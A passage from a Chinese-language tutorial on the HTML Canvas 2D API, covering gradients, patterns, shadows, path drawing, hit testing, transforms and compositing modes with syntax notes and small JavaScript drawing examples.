class="javascript">context.createRadialGradient(x0, y0, r0, x1, y1, r1);</code></pre><ul><li>返回值  返回值是CanvasPattern对象。</li><li>x0  起始圆的横坐标。</li><li>y0  起始圆的纵坐标。</li><li>r0  起始圆的半径。</li><li>x1  结束圆的横坐标。</li><li>y1  结束圆的纵坐标。</li><li>r1  结束圆的半径。</li></ul><ol start="2"><li>案例</li></ol><ul><li>标准两色径向渐变</li></ul><pre><code class="html">&lt;canvas width=&quot;240&quot; height=&quot;120&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var context = canvas.getContext(&#39;2d&#39;);// 创建一个起始圆半径为0的径向渐变对象var gradient = context.createRadialGradient(120, 60, 0, 120, 60, 60);// 设置起止颜色gradient.addColorStop(0, &#39;red&#39;);gradient.addColorStop(1, &#39;green&#39;);// 矩形填充context.fillStyle = gradient;context.fillRect(0, 0, 240, 120);</code></pre><ul><li>色带分隔明显的色环</li></ul><pre><code class="html">&lt;canvas width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var context = canvas.getContext(&#39;2d&#39;);// 创建一个起始圆半径为0的径向渐变对象var gradient = context.createRadialGradient(75, 75, 0, 75, 75, 75);// 设置起止颜色gradient.addColorStop(0, &#39;red&#39;);gradient.addColorStop(0.2, &#39;red&#39;);gradient.addColorStop(0.2, &#39;orange&#39;);gradient.addColorStop(0.4, &#39;orange&#39;);gradient.addColorStop(0.4, &#39;yellow&#39;);gradient.addColorStop(0.6, &#39;yellow&#39;);gradient.addColorStop(0.6, &#39;green&#39;);gradient.addColorStop(0.8, &#39;green&#39;);gradient.addColorStop(0.8, &#39;purple&#39;);gradient.addColorStop(1, &#39;purple&#39;);gradient.addColorStop(1, &#39;transparent&#39;);// 矩形填充context.fillStyle = gradient;context.fillRect(0, 0, 150, 150);</code></pre><h2 id="图案相关"><a href="#图案相关" class="headerlink" title="图案相关"></a>图案相关</h2><h3 id="createPattern"><a href="#createPattern" class="headerlink" title=".createPattern()"></a>.createPattern()</h3><p>创建图案。图案内容可以是图片，可以是canvas元素，也可以是渐变。此方法返回CanvasPattern对象。</p><ol><li>语法</li></ol><pre><code class="javascript">context.createPattern(image, repetition);</code></pre><ul><li>返回值  返回值是CanvasPattern对象。</li><li>image 用来平铺的CanvasImageSource图像。可以是下面的类型</li><li><ul><li>HTMLImageElement，也就是<img>元素。</li></ul></li><li><ul><li>HTMLVideoElement，也就是<video>元素，例如捕获摄像头视频产生的图像信息。</li></ul></li><li><ul><li>HTMLCanvasElement</li></ul></li><li><ul><li>CanvasRenderingContext2D</li></ul></li><li><ul><li>ImageBitmap</li></ul></li><li><ul><li>ImageData</li></ul></li><li><ul><li>Blob</li></ul></li><li>repetition  图案的平铺方式，可以是下面的值：</li><li><ul><li>‘repeat’，水平和垂直平铺。当repetition属性值为空字符串’’或者null，也会按照’repeat’进行渲染。</li></ul></li><li><ul><li>‘repeat-x’，仅水平平铺。</li></ul></li><li><ul><li>‘repeat-y’，仅垂直平铺。</li></ul></li><li><ul><li>‘no-repeat’，不平铺。</li></ul></li></ul><ol start="2"><li>案例<br>图片缩小，并作为纹理显示。我们直接把img元素作为纹理图案是无法控制其尺寸的，我们可以将img元素绘制在大小可控的Canvas元素上，然后把这个Canvas元素作为图案进行平铺即可。</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot; width=&quot;250&quot; height=&quot;167&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 先绘制图片var img = new Image();img.onload = function () &#123;    // 我们创建一个Canvas元素    var canvasCreated = document.createElement(&#39;canvas&#39;);    canvasCreated.width = 50;    canvasCreated.height = 34;    canvasCreated.getContext(&#39;2d&#39;).drawImage(this, 0, 0, 50, 34);    // 页面上需要呈现最终纹理的Canvas上下文    var context = canvas.getContext(&#39;2d&#39;);    // 创建纹理并填充，顺便测试null是否渲染为&#39;repeat&#39;    var pattern = context.createPattern(canvasCreated, null);    context.fillStyle = pattern;    context.fillRect(0, 0, 250, 167);&#125;;img.src = &#39;./1.jpg&#39;;</code></pre><h2 id="阴影相关"><a href="#阴影相关" class="headerlink" title="阴影相关"></a>阴影相关</h2><h3 id="shadowBlur"><a href="#shadowBlur" class="headerlink" title=".shadowBlur"></a>.shadowBlur</h3><p>阴影模糊大小。默认值是0。</p><ol><li>语法</li></ol><pre><code class="javascript">context.shadowBlur = value;</code></pre><ul><li>value  表示阴影的模糊程度。数值类型，可以是小数。默认值是0.会忽略负数、NaN等</li></ul><ol start="2"><li>案例</li></ol><ul><li>矩形块的阴影模糊</li></ul><pre><code class="javascript">// 设置阴影红色，同时模糊大小为10context.shadowColor = &#39;red&#39;;context.shadowBlur = 10;// 填充个淡淡的颜色，以示尊敬context.fillStyle = &#39;#f0f3f9&#39;;context.fillRect(40, 40, 160, 40);</code></pre><ul><li>文字的阴影模糊</li></ul><pre><code class="javascript">// 设置阴影红色，同时模糊大小为10context.shadowColor = &#39;red&#39;;context.shadowBlur = 10;// 文字80像素，黑体context.font = &#39;80px STheiti, simHei&#39;;context.fillText(&#39;模糊&#39;, 40, 90);</code></pre><h3 id="shadowColor"><a href="#shadowColor" class="headerlink" title=".shadowColor"></a>.shadowColor</h3><p>阴影颜色。默认值是全透明黑色。</p><ol><li>语法</li></ol><pre><code class="javascript">context.shadowColor = color;</code></pre><ul><li>color  表示阴影的颜色。各种颜色值都支持，默认是透明黑：rgba(0, 0, 0, 0)</li></ul><ol start="2"><li>案例<br>文字阴影效果，深黑色，无模糊</li></ol><pre><code class="javascript">// 设置阴影深黑色，同时右下角偏移3像素context.shadowColor = &#39;rgb(50, 50, 50)&#39;;context.shadowOffsetY = 3;context.shadowOffsetX = 3;// 文字80像素，黑体，红色context.fillStyle = &#39;red&#39;;context.font = &#39;80px STheiti, simHei&#39;;context.fillText(&#39;颜色&#39;, 40, 88);</code></pre><h3 id="shadowOffsetX"><a href="#shadowOffsetX" class="headerlink" title=".shadowOffsetX"></a>.shadowOffsetX</h3><p>阴影水平偏移大小。默认值是0。</p><ol><li>语法</li></ol><pre><code class="javascript">context.shadowOffsetX = offset;</code></pre><ul><li>offset  表示偏移的大小，数值，默认值是0。忽略Infinity或者NaN值。</li></ul><ol start="2"><li>案例<br>借助足够大的水平偏移，克隆一个相同的文字。</li></ol><pre><code class="javascript">// 设置阴影深黑色，同时右偏移1个字号大小context.shadowColor = &#39;rgb(50, 50, 50)&#39;;context.shadowOffsetX = 80;// 文字80像素，黑体，红色context.fillStyle = &#39;red&#39;;context.font = &#39;80px STheiti, simHei&#39;;context.fillText(&#39;变&#39;, 40, 88);</code></pre><h3 id="shadowOffsetY"><a href="#shadowOffsetY" class="headerlink" title=".shadowOffsetY"></a>.shadowOffsetY</h3><p>阴影垂直偏移大小。默认值是0。</p><ol><li>语法</li></ol><pre><code class="javascript">context.shadowOffsetY = offset;</code></pre><ul><li>offset  表示偏移的大小，数值，默认值是0。忽略Infinity或者NaN值。</li></ul><ol start="2"><li>案例<br>借助足够大的水平偏移，克隆一个相同的文字。</li></ol><pre><code class="javascript">// 上阴影context.shadowColor = &#39;rgb(50, 50, 50)&#39;;context.shadowBlur = 5;context.shadowOffsetY = -5;// 文字80像素，黑体，红色context.fillStyle = &#39;red&#39;;context.font = &#39;70px STheiti, simHei&#39;;context.fillText(&#39;上偏移&#39;, 10, 88);</code></pre><h2 id="绘制路径"><a href="#绘制路径" class="headerlink" title="绘制路径"></a>绘制路径</h2><h3 id="beginPath"><a href="#beginPath" class="headerlink" title=".beginPath()"></a>.beginPath()</h3><p>开始一个新路径。</p><ol><li>语法</li></ol><pre><code class="javascript">context.beginPath();</code></pre><ol start="2"><li>案例<br>两个beginPath()的作用对比</li></ol><pre><code class="javascript">// 开始路径context.beginPath();context.strokeStyle = &#39;blue&#39;;context.moveTo(60, 20);context.lineTo(220, 20);context.stroke();// 开始路径 againcontext.beginPath();context.strokeStyle = &#39;green&#39;;context.moveTo(60, 20);context.lineTo(160, 120);context.stroke();</code></pre><pre><code class="javascript">// 开始路径context.beginPath();context.strokeStyle = &#39;blue&#39;;context.moveTo(60, 20);context.lineTo(220, 20);context.stroke();context.strokeStyle = &#39;green&#39;;context.moveTo(60, 20);context.lineTo(160, 120);context.stroke();</code></pre><p>只声明了一次beginPath()，结果两条折线全部的颜色都是绿色；而两次beginPath()则是一条蓝色，一条绿色。<br>因此，只要是非连续路径绘制，都要记得都要执行一句context.beginPath()。</p><h3 id="closePath"><a href="#closePath" class="headerlink" title=".closePath()"></a>.closePath()</h3><p>闭合一个路径。</p><ol><li>语法</li></ol><pre><code class="javascript">context.closePath();</code></pre><ol start="2"><li>案例<br>两个closePath()的作用对比</li></ol><pre><code class="javascript">// 绘制三角context.beginPath();context.moveTo(10, 10);context.lineTo(140, 70);context.lineTo(70, 140);// 不执行闭合，直接描边context.stroke();// 绘制另外一个三角context.beginPath();context.moveTo(160, 10);context.lineTo(290, 70);context.lineTo(220, 140);// 执行闭合，然后描边context.closePath();context.stroke();</code></pre><h3 id="moveTo"><a href="#moveTo" class="headerlink" title=".moveTo()"></a>.moveTo()</h3><p>路径绘制起始点。</p><ol><li>语法</li></ol><pre><code class="javascript">context.moveTo(x, y);</code></pre><ul><li>x  落点的横坐标。</li><li>y  落点的纵坐标。</li></ul><ol start="2"><li>案例<br>绘制直线一条</li></ol><pre><code class="javascript">context.beginPath();context.moveTo(50, 20);context.lineTo(200, 100);context.stroke();</code></pre><h3 id="lineTo"><a href="#lineTo" class="headerlink" title=".lineTo()"></a>.lineTo()</h3><p>绘制直线到指定坐标点。</p><ol><li>语法</li></ol><pre><code class="javascript">context.lineTo(x, y);</code></pre><ul><li>x  绘制的直线的落点的横坐标。</li><li>y  绘制的直线的落点的纵坐标。</li></ul><ol start="2"><li>案例<br>一个贝塞尔曲线然后执行lineTo()方法</li></ol><pre><code class="javascript">context.beginPath();context.moveTo(50, 20);context.bezierCurveTo(100, 100, 200, 40, 250, 120);context.lineTo(50, 120);context.stroke();</code></pre><h3 id="bezierCurveTo"><a href="#bezierCurveTo" class="headerlink" title=".bezierCurveTo()"></a>.bezierCurveTo()</h3><p>绘制贝赛尔曲线到指定坐标点。</p><ol><li>语法</li></ol><pre><code class="javascript">context.bezierCurveTo(cp1x, cp1y, cp2x, cp2y, x, y);</code></pre><ul><li>cp1x  第1个控制点的横坐标。</li><li>cp1y  第1个控制点的纵坐标。</li><li>cp2x  第2个控制点的横坐标。</li><li>cp2y  第2个控制点的纵坐标。</li><li>x  结束点的横坐标。</li><li>y  结束点的纵坐标。</li></ul><ol start="2"><li>案例</li></ol><pre><code class="javascript">// 开始绘制context.beginPath();context.moveTo(50, 50);context.bezierCurveTo(100, 100, 221, 24, 250, 100);context.stroke();</code></pre><h3 id="quadraticCurveTo"><a href="#quadraticCurveTo" class="headerlink" title=".quadraticCurveTo()"></a>.quadraticCurveTo()</h3><p>绘制二次贝赛尔曲线到指定坐标点。</p><ol><li>语法</li></ol><pre><code class="javascript">context.quadraticCurveTo(cpx, cpy, x, y);</code></pre><ul><li>cpx  控制点的横坐标。</li><li>cpy  控制点的纵坐标。</li><li>x  结束点的横坐标。</li><li>y  结束点的纵坐标。</li></ul><ol start="2"><li>案例</li></ol><pre><code class="javascript">// 开始绘制context.beginPath();context.moveTo(50, 50);context.quadraticCurveTo(72, 99, 243, 57);context.stroke();</code></pre><h3 id="arc"><a href="#arc" class="headerlink" title=".arc()"></a>.arc()</h3><p>绘制圆弧（包括圆）。</p><ol><li>语法</li></ol><pre><code class="javascript">context.arc(x, y, radius, startAngle, endAngl, anticlockwise);</code></pre><ul><li>x  圆弧对应的圆心横坐标。</li><li>y  圆弧对应的圆心纵坐标。</li><li>radius  圆弧的半径大小。</li><li>startAngle  圆弧开始的角度，单位是弧度。</li><li>endAngl  圆弧结束的角度，单位是弧度。</li><li>anticlockwise  （可选）弧度的开始到结束的绘制是按照顺时针来算，还是按时逆时针来算。如果设置为true，则表示按照逆时针方向从startAngle绘制到endAngle。</li></ul><ol start="2"><li>案例</li></ol><ul><li>绘制1&#x2F;4弧度范围的圆弧</li></ul><pre><code class="javascript">// 顺时针绘制0到1/4弧度圆弧context.beginPath();context.arc(150, 75, 50, 0, Math.PI / 2);context.stroke();// 逆时针绘制0到1/4弧度圆弧context.beginPath();context.arc(150, 75, 50, 0, Math.PI / 2, true);context.stroke();</code></pre><ul><li>绘制一个圆</li></ul><pre><code class="javascript">// 绘制完整圆context.beginPath();context.arc(150, 75, 50, 0, Math.PI * 2);context.stroke();</code></pre><h3 id="arcTo"><a href="#arcTo" class="headerlink" title=".arcTo()"></a>.arcTo()</h3><p>绘制圆弧，和之前的点以直线相连。</p><ol><li>语法</li></ol><pre><code class="javascript">context.arcTo(x1, y1, x2, y2, radius);</code></pre><ul><li>x1  第1个控制点的横坐标。</li><li>y1  第1个控制点的纵坐标。</li><li>x2  第2个控制点的横坐标。</li><li>y2  第2个控制点的纵坐标。</li><li>radius  圆弧的半径大小。</li></ul><ol start="2"><li>案例</li></ol><pre><code class="javascript">context.beginPath();context.moveTo(50, 50);context.arcTo(150, 100, 200, 40, 40);context.lineTo(200, 40);context.stroke();</code></pre><h3 id="rect"><a href="#rect" class="headerlink" title=".rect()"></a>.rect()</h3><p>绘制矩形路径。</p><ol><li>语法</li></ol><pre><code class="javascript">context.rect(x, y, width, height);</code></pre><ul><li>x  矩形路径的起点横坐标。</li><li>y  矩形路径的起点纵坐标。</li><li>width  矩形的宽度。</li><li>height  矩形的高度。</li></ul><ol start="2"><li>案例<br>中心位置绘制一个100*100大小的矩形，然后描边</li></ol><pre><code class="javascript">// 矩形context.rect(100, 25, 100, 100);context.stroke();</code></pre><h3 id="ellipse"><a href="#ellipse" class="headerlink" title=".ellipse()"></a>.ellipse()</h3><p>绘制椭圆路径。</p><ol><li>语法</li></ol><pre><code class="javascript">context.ellipse(x, y, radiusX, radiusY, rotation, startAngle, endAngle, anticlockwise);</code></pre><ul><li>x  椭圆弧对应的圆心横坐标。</li><li>y  椭圆弧对应的圆心纵坐标。</li><li>radiusX  椭圆弧的长轴半径大小。</li><li>radiusY  椭圆弧的短轴半径大小。</li><li>rotation  椭圆弧的旋转角度，单位是弧度。</li><li>startAngle  圆弧开始的角度，角度从横轴开始算，单位是弧度。</li><li>endAngle  圆弧结束的角度，单位是弧度。</li><li>anticlockwise  （可选）弧度的开始到结束的绘制是按照顺时针来算，还是按时逆时针来算。如何设置为true，则表示按照逆时针方向从startAngle绘制到endAngle。</li></ul><ol start="2"><li>案例<br>绘制一个长轴短轴比2:1，同时旋转45°的椭圆</li></ol><pre><code class="javascript">// 绘制椭圆context.ellipse(150, 75, 80, 40, Math.PI / 4, 0, 2 * Math.PI);context.stroke();</code></pre><h3 id="clip"><a href="#clip" class="headerlink" title=".clip()"></a>.clip()</h3><p>创建剪裁路径，之后绘制的路径只有在里面的才会显示。</p><ol><li>语法</li></ol><pre><code class="javascript">context.clip();context.clip(fillRule);context.clip(path, fillRule);</code></pre><ul><li>fillRule  填充规则。用来确定一个点实在路径内还是路径外。可选值包括：</li><li><ul><li>nonzero：非零规则。此乃默认规则。</li></ul></li><li><ul><li>evenodd：奇偶规则。</li></ul></li><li>path  指Path2D对象。</li></ul><ol start="2"><li>案例<br>利用剪裁实现一个图案填充效果。实现图案填充，标准用法是创建一个Pattern对象，然后作为fillStyle进行路径填充。这里，我们还可以使用clip()剪裁实现，这样就不用new一个Pattern对象了。例如，实现一个三角形，里面是人物照片图案。</li></ol><pre><code class="javascript">var context = canvas.getContext(&#39;2d&#39;);// 需要图片先加载完毕var img = new Image();img.onload = function () &#123;    // 剪裁路径是三角形    context.beginPath();    context.moveTo(20, 20);    context.lineTo(200, 80);    context.lineTo(110, 150);    // 剪裁    context.clip();    // 填充图片    context.drawImage(img, 0, 0, 250, 167);&#125;;img.src = &#39;./1.jpg&#39;;</code></pre><h2 id="位置检测"><a href="#位置检测" class="headerlink" title="位置检测"></a>位置检测</h2><h3 id="isPointInPath"><a href="#isPointInPath" class="headerlink" title=".isPointInPath()"></a>.isPointInPath()</h3><p>当前点是否在指定路径内。</p><ol><li>语法</li></ol><pre><code class="javascript">context.isPointInPath(x, y);context.isPointInPath(x, y, fillRule);// 下面语法IE不支持context.isPointInPath(path, x, y);context.isPointInPath(path, x, y, fillRule);</code></pre><ul><li>返回值  返回Boolean值。</li><li>x  用来检测的点的横坐标。</li><li>y  用来检测的点的纵坐标。</li><li>fillRule  填充规则。用来确定一个点实在路径内还是路径外。可选值包括：</li><li><ul><li>nonzero：非零规则，此乃默认规则。</li></ul></li><li><ul><li>evenodd：奇偶规则。</li></ul></li><li>path  指Path2D对象。</li></ul><ol start="2"><li>案例<br>在Canvas画布上画两个圈圈，然后看看圈内圈外圈上这几个点的返回值是什么</li></ol><pre><code class="javascript">// 画一个圆context.arc(120, 120, 80, 0, Math.PI * 2);context.stroke();// 用来测试的点坐标们var arrPoints = [&#123;    x: 50,    y: 50&#125;, point2 = &#123;    x: 150,    y: 150&#125;, point3 = &#123;    x: 120,    y: 40&#125;];arrPoints.forEach(function (point) &#123;    // 检测点是否在路径内    point.isPointInPath = context.isPointInPath(point.x, point.y);&#125;);arrPoints.forEach(function (point) &#123;    // 标记这几个点    context.fillStyle = &#39;red&#39;;    context.beginPath();    context.arc(point.x, point.y, 3, 0, Math.PI * 2);    context.fill();    // 检测结果以文本方式绘制    context.font = &#39;14px arial&#39;;    context.fillText(point.isPointInPath, point.x + 5, point.y);&#125;);</code></pre><h3 id="isPointInStroke"><a href="#isPointInStroke" class="headerlink" title=".isPointInStroke()"></a>.isPointInStroke()</h3><p>当前点是否在指定路径描边上。</p><ol><li>语法</li></ol><pre><code class="javascript">context.isPointInStroke(x, y);context.isPointInStroke(path, x, y);</code></pre><ul><li>返回值  返回Boolean值。</li><li>x  用来检测的点的横坐标。</li><li>y  用来检测的点的纵坐标。</li><li>path  指Path2D对象。</li></ul><ol start="2"><li>案例<br>在Canvas画布上画两个圈圈，然后看看圈内圈外圈上这几个点的返回值是什么</li></ol><pre><code class="javascript">// 画一个圆context.arc(120, 120, 80, 0, Math.PI * 2);context.lineWidth = 5;context.stroke();// 用来测试的点坐标们var arrPoints = [&#123;    x: 40,    y: 40&#125;, point2 = &#123;    x: 120,    y: 180&#125;, point3 = &#123;    x: 120,    y: 38&#125;];arrPoints.forEach(function (point) &#123;    // 检测点是否在路径内    point.isPointInStroke = context.isPointInStroke(point.x, point.y);&#125;);arrPoints.forEach(function (point) &#123;    // 标记这几个点    context.fillStyle = &#39;red&#39;;    context.beginPath();    context.arc(point.x, point.y, 3, 0, Math.PI * 2);    context.fill();    // 检测结果以文本方式绘制    context.font = &#39;14px arial&#39;;    context.fillText(point.isPointInStroke, point.x + 5, point.y);&#125;);</code></pre><h2 id="变换"><a href="#变换" class="headerlink" title="变换"></a>变换</h2><h3 id="rotate"><a href="#rotate" class="headerlink" title=".rotate()"></a>.rotate()</h3><p>旋转。</p><ol><li>语法</li></ol><pre><code class="javascript">context.rotate(angle);</code></pre><ul><li>angle  Canvas画布坐标系旋转的角度，单位是弧度。注意，此旋转和CSS3的旋转变换不一样，旋转的是坐标系，而非元素。因此，实际开发的时候，旋转完毕，需要将坐标系再还原。</li></ul><ol start="2"><li>案例</li></ol><ul><li>基本旋转</li></ul><pre><code class="javascript">// 旋转45度context.rotate(45 * Math.PI / 180);// 字体填充context.font = &#39;20px STHeiti, SimHei&#39;;context.fillText(&#39;旋转，跳跃，我闭着眼&#39;, 60, -40, 188);// 重置当前的变换矩阵为初始态context.setTransform(1, 0, 0, 1, 0, 0);</code></pre><ul><li>画布和图片同步旋转</li></ul><pre><code class="html">&lt;canvas id=&quot;canvas2&quot; width=&quot;200&quot; height=&quot;300&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var context = canvas2.getContext(&#39;2d&#39;);var width = canvas2.width;var height = canvas2.height;// 加载图片素材var img = new Image();img.onload = function () &#123;    // 先位移坐标到中心    context.translate(width / 2, height / 2);    // 旋转90度    context.rotate(90 * Math.PI / 180);    // 此时按照旋转后的尺寸    // 把定位中心移动到左上角    context.translate(-1 * height / 2, -1 * width / 2);    // 绘制图片    context.drawImage(this, 0, 0, height, width);    // 坐标系还原到初始    context.setTransform(1, 0, 0, 1, 0, 0);&#125;;img.src = &#39;./1.jpg&#39;;</code></pre><h3 id="scale"><a href="#scale" class="headerlink" title=".scale()"></a>.scale()</h3><p>缩放。</p><ol><li>语法</li></ol><pre><code class="javascript">context.scale(x, y);</code></pre><ul><li>x  Canvas坐标系水平缩放的比例。支持小数，如果值是-1，表示水平翻转。</li><li>y  Canvas坐标系垂直缩放的比例。支持小数，如果值是-1，表示垂直翻转。</li></ul><ol start="2"><li>案例</li></ol><ul><li>基本使用</li></ul><pre><code class="javascript">// 显示绘制个正方形用来对比context.fillRect(10, 10, 10, 10);// 缩放context.scale(10, 3);// 再次绘制context.fillRect(10, 10, 10, 10);// 恢复坐标系context.setTransform(1, 0, 0, 1, 0, 0);</code></pre><ul><li>垂直翻转</li></ul><pre><code class="javascript">// 记住Canvas状态context.save();// 来来来，垂直翻转下context.scale(1, -1);// 填充文字context.font = &#39;32px STHeiti, SimHei&#39;;context.fillText(&#39;换个角度看世界&#39;, 36, -64);// 恢复状态，不要影响接下来的绘制context.restore();</code></pre><h3 id="translate"><a href="#translate" class="headerlink" title=".translate()"></a>.translate()</h3><p>位移。</p><ol><li>语法</li></ol><pre><code class="javascript">context.translate(x, y);</code></pre><ul><li>x  坐标系水平位移的距离。</li><li>y  坐标系垂直位移的距离。</li></ul><ol start="2"><li>案例<br>借助translate()方法，实现Canvas元素内容以Canvas画布的中心点为变换点进行旋转。</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot; width=&quot;300&quot; height=&quot;200&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var img = new Image();img.onload = function () &#123;    var context = canvas.getContext(&#39;2d&#39;);    // 坐标位移    context.translate(150, 100);    // 旋转45度    context.rotate(45 * Math.PI / 180);    // 再位移回来    context.translate(-150, -100);    // 此时绘制图片就是中心旋转了    context.drawImage(this, 0, 0, 300, 200);    // 坐标系还原    context.setTransform(1, 0, 0, 1, 0, 0);&#125;;img.src = &#39;./1.jpg&#39;;</code></pre><h3 id="transform"><a href="#transform" class="headerlink" title=".transform()"></a>.transform()</h3><p>当前矩阵变换基础上再次矩阵变换。</p><ol><li>语法</li></ol><pre><code class="javascript">context.transform(a, b, c, d, e, f);</code></pre><ul><li>a  水平缩放。</li><li>b  水平斜切。</li><li>c  垂直斜切。</li><li>d  垂直缩放。</li><li>e  水平位移。</li><li>f  垂直位移。</li></ul><ol start="2"><li>案例<br>借助transform()方法绘制一个平行四边形</li></ol><pre><code class="javascript">context.transform(1, 0, 1, 1, 0, 0);context.fillRect(10, 20, 100, 100);</code></pre><h3 id="setTransform"><a href="#setTransform" class="headerlink" title=".setTransform()"></a>.setTransform()</h3><p>直接重置为当前设置的矩阵变换。(此方法和transform()方法的区别在于，后者不会完全重置已有的变换，而是累加。)</p><ol><li>语法</li></ol><pre><code class="javascript">context.setTransform(a, b, c, d, e, f);</code></pre><ul><li>a  水平缩放。</li><li>b  水平斜切。</li><li>c  垂直斜切。</li><li>d  垂直缩放。</li><li>e  水平位移。</li><li>f  垂直位移。</li></ul><ol start="2"><li>案例<br>借助setTransform()方法绘制一个平行四边形</li></ol><pre><code class="javascript">context.setTransform(1, 0, 1, 1, 0, 0);context.fillRect(10, 20, 100, 100);</code></pre><h2 id="透明度和层级"><a href="#透明度和层级" class="headerlink" title="透明度和层级"></a>透明度和层级</h2><h3 id="globalAlpha"><a href="#globalAlpha" class="headerlink" title=".globalAlpha"></a>.globalAlpha</h3><p>全局透明度。</p><blockquote><p>对于纯色图形的绘制，如果需要用到半透明或者不透明，建议使用RGBA或者HSLA色值进行控制，比使用globalAlpha方便，因为按照我个人的使用经验，使用globalAlpha设置透明度之后都是需要再进行还原设置的，而直接使用RGBA或者HSLA色值则没有这样的重置操作。<br>但是，如果是绘制图片，借助globalAlpha属性是更好的选择</p></blockquote><ol><li>语法</li></ol><pre><code class="javascript">context.globalAlpha = value;</code></pre><ul><li>value  value就是设置的全局透明度，范围是0到1，范围以外的值会被忽略。</li></ul><ol start="2"><li>案例<br>先绘制半透明图片，再绘制不透明文字</li></ol><pre><code class="javascript">// 先存储当前的上下文状态context.save();// 设置图片半透明context.globalAlpha = 0.5;// 绘制图片context.drawImage(img, 0, 0);// 透明度还原context.restore();// 然后绘制文字context.font = &#39;48px serif&#39;;context.fillText(&#39;标题&#39;, 96, 90);</code></pre><p>这里globalAlpha的重置用的是Canvas独有的save()和restore()组合，这两个组合方法可以还原所有Canvas上下文状态，不只是透明度。在本例中，就只有透明度，因此，我们使用context.globalAlpha &#x3D; 1重置也是可以的。</p><h3 id="globalCompositeOperation"><a href="#globalCompositeOperation" class="headerlink" title=".globalCompositeOperation"></a>.globalCompositeOperation</h3><p>设置图形叠加时候的混合方式，可以用来改变绘制元素上下叠加关系，也就是层级。</p><ol><li>语法</li></ol><pre><code class="javascript">context.globalCompositeOperation = type;</code></pre><p>type有以下参数值：</p><ul><li>source-over  绘制图形的默认混合方式，直接在现有图形的上方绘制，纯视觉覆盖。</li><li>source-in  仅在和原Canvas图形重叠的位置绘制新图形，否则处理为透明。如果重叠位置是半透明颜色，则也处理为半透明。此效果类似遮罩，新内容为显示层，原内容是遮罩层，遮罩层无论张什么样子，都不显示。</li><li>source-out  和source-in相反，重叠的位置是透明的，不重叠的或者半透明的重叠区域反而显示新图形。同样，原内容无论性质如何，最终效果都不会出现。</li><li>source-atop  尽在新内容与原内容重叠的位置进行类似遮罩的绘制，如果们没有重叠的位置，则原封不动，这个和source-in区别在于source-in就算与原内容不重叠，原内容也永远不会显示，但source-atop会保留。</li><li>destination-over  destination- * 系列和source- * 系列的区别就是动作的主体是新内容还是原内容。source- * 系列是新内容，而destination- * 系列动作主体是元内容。例如这里的destination-over表示原内容在上方，也就是新内容在原内容的下方绘制。</li><li>destination-in  显示原内容和新内容重叠的部分。</li><li>destination-out  隐藏原内容和新内容重叠的部分。</li><li>destination-atop  原内容只显示和新内容重叠的部分，同时新内容在下方显示。</li><li>lighter  无论是哪种语言，哪种工具的混合模式，其实概念都类似的。如果这里的lighter等同于Adobe Photoshop中lighter color的话，则这个属性值可以理解为自然光混合效果。红绿蓝混合会成为白色。其色值混合原理如下，比较新内容和原内容颜色的所有通道值的总和，并显示更高值的颜色。例如，红色RGB(255,0,0)和蓝色RGB(0,0,255)进行混合，则最终颜色值是RGB(255,0,255)，也就是紫色。实际取色发现还是和PS还是有些出入的，并不是纯紫色。因此，这里的理解并不一定完全准确，仅供参考。</li><li>copy  只显示新内容。</li><li>xor  互相重叠的区域是透明的。</li><li>multiply  正片叠底。顶层的像素与底层的对应像素相乘。结果是一幅更黑暗的图画。</li><li>screen  滤色。像素反转，相乘，然后再反转。最终得到更淡的图形（和multiply相反）。</li><li>overlay  叠加。multiply和screen组合效果。基础图层上暗的部分更暗，亮的部分更亮。</li><li>darken  变暗。保留原内容和新内容中最暗的像素。</li><li>lighten  变亮。保留原内容和新内容中最亮的像素。</li><li>color-dodge  颜色减淡。底部图层色值除以顶部图层的反相色值。</li><li>color-burn  颜色加深。底部图层的色值除以顶部图层色值，得到的结果再反相。</li><li>hard-light  强光。类似overlay，是multiply和screen组合效果。只不过底层和顶层位置交换下。</li><li>soft-light  柔光。hard-light的柔和版本。纯黑色或白色不会生成为纯黑色或白色。</li><li>difference  差异。顶层色值减去底层色值的绝对值。如果都是白色，则最后是黑色，因为值为0；什么时候是白色呢，例如RGB(255,0,0)和RGB(0,255,255)，色值相减后绝对值是RGB(255,255,255)。</li><li>exclusion  排除。类似difference，不过对比度较低。</li><li>hue  色调。最终的颜色保留底层的亮度和色度，同时采用顶层的色调。</li><li>saturation  饱和度。最终的颜色保留底层的亮度和色调，同时采用顶层的色度。</li><li>color  色值。最终的颜色保留底层的亮度，同时采用顶层的色调和色度。</li><li>luminosity  亮度。最终的颜色保留底层的色调和色度，同时采用顶层的亮度。</li></ul><ol start="2"><li>案例</li></ol><ul><li>文字镂空效果</li></ul><pre><code class="javascript">// 绘制图片context.drawImage(img, 0, 0, 300, 200);// 改变混合方式context.globalCompositeOperation = &#39;destination-out&#39;;// 绘制文本context.font = &#39;bold 120px SimHei, STHeiti&#39;;context.fillText(&#39;镂空&#39;, 25, 140);</code></pre><ul><li>给图片增加装饰效果</li></ul><pre><code class="javascript">// 绘制底图context.drawImage(imgBase, 0, 0, 300, 200);// 设置混合模式为滤色context.globalCompositeOperation = &#39;screen&#39;;// 绘制装饰图context.drawImage(imgScreen, 0, 0, 300, 200);</code></pre><h2 id="图片与像素"><a href="#图片与像素" class="headerlink" title="图片与像素"></a>图片与像素</h2><h3 id="drawImage"><a href="#drawImage" class="headerlink" title=".drawImage()"></a>.drawImage()</h3><p>图片绘制在画布上。</p><ol><li>语法</li></ol><pre><code class="javascript">context.drawImage(image, dx, dy);context.drawImage(image, dx, dy, dWidth, dHeight);context.drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);</code></pre><ul><li>image  绘制在Canvas上的元素，可以是各类Canvas图片资源，如img图片，SVG图像，Canvas元素本身等。</li><li>dx  在Canvas画布上规划一片区域用来放置图片，dx就是这片区域的左上角横坐标。</li><li>dy  在Canvas画布上规划一片区域用来放置图片，dy就是这片区域的左上角纵坐标。</li><li>dWidth  在Canvas画布上规划一片区域用来放置图片，dWidth就是这片区域的宽度。</li><li>dHeight  在Canvas画布上规划一片区域用来放置图片，dHeight就是这片区域的高度。</li><li>sx  